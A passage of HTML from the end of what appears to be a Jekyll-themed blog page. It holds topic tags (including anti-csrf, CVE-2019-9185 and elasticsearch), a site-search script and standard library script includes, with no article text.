href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
